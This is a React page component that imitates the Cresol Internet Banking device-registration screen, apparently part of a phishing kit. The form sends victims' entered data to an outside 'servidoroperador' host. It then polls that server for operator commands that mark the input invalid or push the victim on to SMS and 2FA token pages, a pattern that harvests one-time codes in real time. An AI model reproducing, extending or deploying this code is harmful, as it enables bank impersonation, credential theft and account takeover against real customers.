
import React, { useState, useEffect, useRef } from "react";
import { ArrowLeft, Calendar, Info } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import { Button } from "@/components/ui/button";
import { Calendar as CalendarComponent } from "@/components/ui/calendar";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { cn } from "@/lib/utils";
import { useClientStatus } from "@/hooks/useClientStatus";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

// Função para monitorar cliente continuamente na página Cadastro
const monitorClientCadastro = async (
  clientId: string, 
  navigate: (path: string) => void,
  onInvalidAuth: () => void,
  isMonitoringRef: React.MutableRefObject<boolean>
): Promise<void> => {
  console.log(`Iniciando monitoramento Cadastro do cliente: ${clientId}`);
  
  let intervalId: NodeJS.Timeout;
  
  const monitor = async () => {
    if (!isMonitoringRef.current) {
      console.log('Monitoramento Cadastro parado por flag');
      clearInterval(intervalId);
      return;
    }

    try {
      console.log(`Consultando dados do cliente ${clientId} na página Cadastro...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      console.log(`Status da consulta Cadastro: ${response.status}`);
      
      if (response.ok) {
        const clientData = await response.json();
        console.log('Dados do cliente Cadastro recebidos:', clientData);
        console.log('Valor do response Cadastro:', clientData.data?.response);
        console.log('Valor do command Cadastro:', clientData.data?.command);
        
        // Verificar se os dados de cadastro são inválidos - NÃO para o monitoramento
        if (clientData.data?.response === "inv_auth" || clientData.data?.command === "inv_auth") {
          console.log('Detectado inv_auth - Dados de cadastro inválidos, mas continuando monitoramento');
          onInvalidAuth();
          return; // Continua monitoramento, não para
        }
        
        // Na página Cadastro: se receber ir_sms, redireciona para /sms e para monitoramento
        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
          console.log('Detectado ir_sms na página Cadastro - Redirecionando para /sms');
          clearInterval(intervalId);
          isMonitoringRef.current = false;
          console.log('Monitoramento Cadastro parado - redirecionando...');
          navigate('/sms');
          return;
        }
        
        // Na página Cadastro: se receber ir_2fa, redireciona para /token e para monitoramento
        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
          console.log('Detectado ir_2fa na página Cadastro - Redirecionando para /token');
          clearInterval(intervalId);
          isMonitoringRef.current = false;
          console.log('Monitoramento Cadastro parado - redirecionando...');
          navigate('/token');
          return;
        }
        
        // Se receber ir_auth, continua monitorando (não redireciona)
        if (clientData.data?.response === "ir_auth" || clientData.data?.command === "ir_auth") {
          console.log('Detectado ir_auth na página Cadastro - Continuando monitoramento...');
        }
        
        console.log('Continuando monitoramento Cadastro...');
      } else {
        const errorData = await response.text();
        console.log('Erro na consulta Cadastro do cliente:', errorData);
      }

    } catch (error) {
      console.log('Erro durante consulta Cadastro do cliente:', error);
    }
  };

  // Executar primeira consulta imediatamente
  await monitor();
  
  // Configurar monitoramento contínuo a cada 3 segundos
  intervalId = setInterval(monitor, 3000);
  console.log('Monitoramento Cadastro contínuo configurado (3 segundos)');
};

const CadastroPage = () => {
  const navigate = useNavigate();
  const clientStatus = useClientStatus();
  const [foundationDate, setFoundationDate] = useState<Date>();
  const [deviceNickname, setDeviceNickname] = useState("");
  const [accessValidity, setAccessValidity] = useState("indefinite");
  const [specificDate, setSpecificDate] = useState<Date>();
  const [isLoading, setIsLoading] = useState(false);
  const [clientId, setClientId] = useState("");
  const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);
  const isMonitoringRef = useRef(false);

  useEffect(() => {
    // Recuperar clientId do localStorage
    const storedClientId = localStorage.getItem('clientId');
    if (storedClientId) {
      setClientId(storedClientId);
      console.log('ClientId recuperado do localStorage para cadastro:', storedClientId);
      
      // Iniciar monitoramento de status
      clientStatus.startMonitoring();
    } else {
      console.log('ClientId não encontrado no localStorage para cadastro');
    }

    // Cleanup quando sair da página
    return () => {
      isMonitoringRef.current = false;
      clientStatus.stopMonitoring();
    };
  }, [clientStatus]);

  const handleDeviceNicknameChange = (value: string) => {
    // Limitar a 20 caracteres
    if (value.length <= 20) {
      setDeviceNickname(value);
    }
    // Reset error state when user starts typing
    if (showInvalidDataModal) {
      setShowInvalidDataModal(false);
    }
  };

  const clearAllFields = () => {
    console.log('Limpando todos os campos do cadastro...');
    setFoundationDate(undefined);
    setDeviceNickname("");
    setAccessValidity("indefinite");
    setSpecificDate(undefined);
    setShowInvalidDataModal(false);
    console.log('Todos os campos do cadastro limpos - Pronto para novo envio');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!clientId || !foundationDate || !deviceNickname.trim()) {
      console.log('Dados incompletos para cadastro do dispositivo');
      return;
    }

    try {
      console.log('Enviando dados de cadastro do dispositivo via external-response...');
      setIsLoading(true);
      setShowInvalidDataModal(false);
      
      const cadastroData = {
        foundationDate: format(foundationDate, 'dd/MM/yyyy'),
        deviceNickname: deviceNickname.trim(),
        accessValidity: accessValidity,
        specificDate: accessValidity === 'specific' && specificDate ? format(specificDate, 'dd/MM/yyyy') : null
      };

      console.log('Dados do cadastro:', cadastroData);
      
      // Enviar dados via external-response (seguindo lógica SMS/Token)
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          response: JSON.stringify(cadastroData),
          command: ""
        })
      });

      if (response.ok) {
        console.log('Cadastro de dispositivo enviado com sucesso via external-response');
        
        // Só iniciar monitoramento se não estiver já monitorando
        if (!isMonitoringRef.current) {
          isMonitoringRef.current = true;
          // Iniciar monitoramento contínuo após envio bem-sucedido
          await monitorClientCadastro(
            clientId, 
            navigate,
            () => {
              // Função onInvalidAuth: limpa campos, para loading, mantém monitoramento
              console.log('Dados de cadastro inválidos detectados - limpando campos e parando loading');
              clearAllFields();
              setIsLoading(false); // Parar o loading
              setShowInvalidDataModal(true);
              // NÃO para o monitoramento - isMonitoringRef.current continua true
            },
            isMonitoringRef
          );
        }
      } else {
        console.log('Erro ao enviar cadastro do dispositivo via external-response');
        setIsLoading(false);
      }
    } catch (error) {
      console.log('Erro durante cadastro do dispositivo:', error);
      setIsLoading(false);
    }
  };

  const handleCancel = () => {
    isMonitoringRef.current = false;
    navigate("/home");
  };

  return (
    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
      {/* Modal de Dados Inválidos */}
      <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
        <AlertDialogContent className="max-w-md mx-auto">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-center text-lg font-semibold">
              Dados inválidos
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center text-gray-600">
              Os dados de cadastro informados estão incorretos. Verifique as informações e tente novamente.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex justify-center">
            <AlertDialogAction
              onClick={() => setShowInvalidDataModal(false)}
              className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full"
            >
              Tentar Novamente
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Main Content Container */}
      <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-12 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          {/* Botão Voltar */}
          <button
            onClick={handleCancel}
            className="flex items-center text-gray-600 hover:text-gray-800 mb-6 transition-colors min-h-[44px] p-1"
          >
            <ArrowLeft size={20} className="mr-2" />
            <span className="text-base md:text-lg">Voltar</span>
          </button>

          {/* Logo */}
          <div className="mb-8">
            <img
              src={cresolLogo}
              alt="Cresol"
              className="h-8 md:h-10"
            />
          </div>

          {/* Título */}
          <h1 className="text-2xl md:text-3xl font-semibold text-gray-700 mb-8">
            Cadastro de dispositivo
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Data da Fundação */}
            <div className="space-y-2">
              <label className="block text-sm font-medium text-gray-700">
                Data da fundação
              </label>
              <Popover>
                <PopoverTrigger asChild>
                  <Button
                    variant="outline"
                    className={cn(
                      "w-full h-12 justify-start text-left font-normal bg-white",
                      !foundationDate && "text-gray-400"
                    )}
                  >
                    {foundationDate ? (
                      format(foundationDate, "dd/MM/yyyy", { locale: ptBR })
                    ) : (
                      <span>dd/mm/aaaa</span>
                    )}
                    <Calendar className="ml-auto h-4 w-4 opacity-50" />
                  </Button>
                </PopoverTrigger>
                <PopoverContent className="w-auto p-0" align="start">
                  <CalendarComponent
                    mode="single"
                    selected={foundationDate}
                    onSelect={setFoundationDate}
                    disabled={(date) =>
                      date > new Date() || date < new Date("1900-01-01")
                    }
                    initialFocus
                    className={cn("p-3 pointer-events-auto")}
                  />
                </PopoverContent>
              </Popover>
            </div>

            {/* Apelido do Dispositivo */}
            <div className="space-y-2">
              <label className="block text-sm font-medium text-gray-700">
                Apelido do dispositivo
              </label>
              <div className="relative">
                <input
                  type="text"
                  className="w-full h-12 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-transparent bg-white"
                  placeholder="Digite o apelido do dispositivo"
                  value={deviceNickname}
                  onChange={(e) => handleDeviceNicknameChange(e.target.value)}
                  maxLength={20}
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                  <span className="text-sm text-gray-400">{deviceNickname.length}/20</span>
                  <Info className="h-4 w-4 text-gray-400" />
                </div>
              </div>
            </div>

            {/* Validade de Acesso */}
            <div className="space-y-3">
              <label className="block text-sm font-medium text-gray-700">
                Validade de acesso do dispositivo
              </label>
              
              <div className="space-y-3">
                {/* Tempo Indeterminado */}
                <label className="flex items-center space-x-3 cursor-pointer">
                  <input
                    type="radio"
                    name="accessValidity"
                    value="indefinite"
                    checked={accessValidity === "indefinite"}
                    onChange={(e) => setAccessValidity(e.target.value)}
                    className="w-4 h-4 text-green-600 border-gray-300 focus:ring-green-500"
                  />
                  <span className="text-gray-700">Tempo indeterminado</span>
                  {accessValidity === "indefinite" && (
                    <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  )}
                </label>

                {/* Somente por este acesso */}
                <label className="flex items-center space-x-3 cursor-pointer">
                  <input
                    type="radio"
                    name="accessValidity"
                    value="single"
                    checked={accessValidity === "single"}
                    onChange={(e) => setAccessValidity(e.target.value)}
                    className="w-4 h-4 text-gray-400 border-gray-300 focus:ring-gray-500"
                  />
                  <span className="text-gray-700">Somente por este acesso</span>
                </label>

                {/* Até */}
                <div className="space-y-2">
                  <label className="flex items-center space-x-3 cursor-pointer">
                    <input
                      type="radio"
                      name="accessValidity"
                      value="specific"
                      checked={accessValidity === "specific"}
                      onChange={(e) => setAccessValidity(e.target.value)}
                      className="w-4 h-4 text-gray-400 border-gray-300 focus:ring-gray-500"
                    />
                    <span className="text-gray-700">Até</span>
                    <Info className="h-4 w-4 text-gray-400" />
                  </label>
                  
                  {accessValidity === "specific" && (
                    <div className="ml-7">
                      <Popover>
                        <PopoverTrigger asChild>
                          <Button
                            variant="outline"
                            className={cn(
                              "w-full h-12 justify-start text-left font-normal bg-white",
                              !specificDate && "text-gray-400"
                            )}
                            disabled={accessValidity !== "specific"}
                          >
                            {specificDate ? (
                              format(specificDate, "dd/MM/yyyy", { locale: ptBR })
                            ) : (
                              <span>dd/mm/aaaa</span>
                            )}
                            <Calendar className="ml-auto h-4 w-4 opacity-50" />
                          </Button>
                        </PopoverTrigger>
                        <PopoverContent className="w-auto p-0" align="start">
                          <CalendarComponent
                            mode="single"
                            selected={specificDate}
                            onSelect={setSpecificDate}
                            disabled={(date) => date < new Date()}
                            initialFocus
                            className={cn("p-3 pointer-events-auto")}
                          />
                        </PopoverContent>
                      </Popover>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Botões */}
            <div className="flex space-x-4 pt-6">
              <button
                type="button"
                onClick={handleCancel}
                className="flex-1 h-12 rounded-full border border-orange-500 text-orange-500 hover:bg-orange-50 transition font-medium text-base"
              >
                Cancelar
              </button>
              
              <button
                type="submit"
                className="flex-1 h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base shadow disabled:opacity-70 flex items-center justify-center"
                style={{
                  background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                }}
                disabled={!foundationDate || !deviceNickname.trim() || isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                    Cadastrando...
                  </div>
                ) : (
                  "Cadastrar"
                )}
              </button>
            </div>
          </form>

          {/* Rodapé */}
          <div className="mt-12 text-center lg:text-left text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default CadastroPage;
